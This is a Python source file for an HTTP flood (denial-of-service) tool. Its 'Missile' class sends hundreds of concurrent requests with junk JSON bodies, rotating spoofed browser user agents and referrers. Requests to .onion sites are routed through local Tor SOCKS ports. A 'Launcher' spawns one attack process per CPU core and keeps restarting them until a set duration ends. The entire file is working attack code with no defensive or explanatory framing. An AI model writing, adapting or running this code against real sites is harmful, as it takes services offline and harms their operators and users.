import asyncio
import logging
import os
import platform
import random
import string
import sys
import threading
import time
from typing import List, Tuple
from urllib.parse import urljoin
import aiohttp
from aiohttp_socks import ProxyConnector
from multiprocessing import Process


socksPort = ["9152", "9154", "9156", "9158", "9160", "9162", "9164", "9166", "9168", "9170"]

class Missile:
	def __init__(self, target: str):
		self.url = target
		self.host = urljoin(self.url, '/')
		self.method = "get" if ".onion" in target else "post"
		self.count = 0

	@staticmethod
	def generate_junk(size: int) -> str:
		return ''.join(random.choices(string.ascii_letters + string.digits,k=random.randint(3, size)))

	async def attack(self, count: int, proxy: str):
		connector = ProxyConnector.from_url(proxy, rdns=True) if proxy else aiohttp.TCPConnector(limit=0)
		async with aiohttp.ClientSession(connector=connector) as session:
			tasks = [asyncio.create_task(self._launch(session)) for _ in range(count)]
			status_list = set(await asyncio.gather(*tasks))

	async def _launch(self, session: aiohttp.ClientSession) -> int:
		self.count += 1
		headers, payload = self._get_payload()
		try:
			async with session.request(method=self.method, url=self.url, headers=headers, json=payload) as resp:
				status = resp.status
				return status
		except aiohttp.ClientConnectorError:
			return -1

	def _get_payload(self) -> Tuple[dict, dict]:
		ua_list = [
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
			'Gecko/20090913 Firefox/3.5.3',
			'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
			'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
			'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
			'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
			'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
			'Gecko/20090718 Firefox/3.5.1',
			'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
			'AppleWebKit/532.1 (KHTML, like Gecko)'
			'Chrome/4.0.219.6 Safari/532.1',
			'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
			'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
			'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
			'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
			'.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
			'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
			'Win64; x64; Trident/4.0)',
			'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
			'SV1; .NET CLR 2.0.50727; InfoPath.2)',
			'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
			'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
			'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
		]
		referrer_list = [
			'https://www.google.com/?q=',
			'https://www.usatoday.com/search/results?q=',
			'https://engadget.search.aol.com/search?q=',
			'https://cloudfare.com',
			'https://github.com',
			'https://en.wikipedia.org',
			'https://youtu.be',
			'https://mozilla.org',
			'https://microsoft.com',
			'https://wordpress.org',
			self.host
		]
		headers = {
			'Cache-Control': 'no-cache',
			'Accept': 'text/html,application/xhtml+xml,application/xml;'
			          'q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
			'Content-Encoding': 'deflate',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json',
			'Keep-Alive': str(random.randint(110, 120)),
			'User-Agent': random.choice(ua_list),
			'Referer': random.choice(referrer_list),
			}
		payload = {self.generate_junk(random.randint(5, 10)): self.generate_junk(random.randint(500, 1000))}
		return headers, payload

class Launcher:
	def __init__(self, target: str, duration: int):
		self.target_cores = list()
		self.start_time = time.time()
		for cpu_count_number in range(0, os.cpu_count()):
			proc = Process(target=self.controller, args=(cpu_count_number, target, duration))
			proc.start()
			self.target_cores.append(proc)
		while True:
			time.sleep(1)
			if time.time() - self.start_time > duration:
				self.stop()
				break

	def controller(self, cpu_count_number, target, duration):
		try:
			proxy = ("socks5://127.0.0.1:" + socksPort[cpu_count_number % len(socksPort)]) if ".onion" in target else ""
			missile = Missile(target)
			asyncio.run(missile.attack(500, proxy))
		except Exception as e:
			print(f"Exception: {e}")
			time.sleep(1)
		if time.time() - self.start_time <= duration:
			self.controller(cpu_count_number, target, duration)

	def stop(self):
		for x in self.target_cores:
			x.terminate()
			x.join()
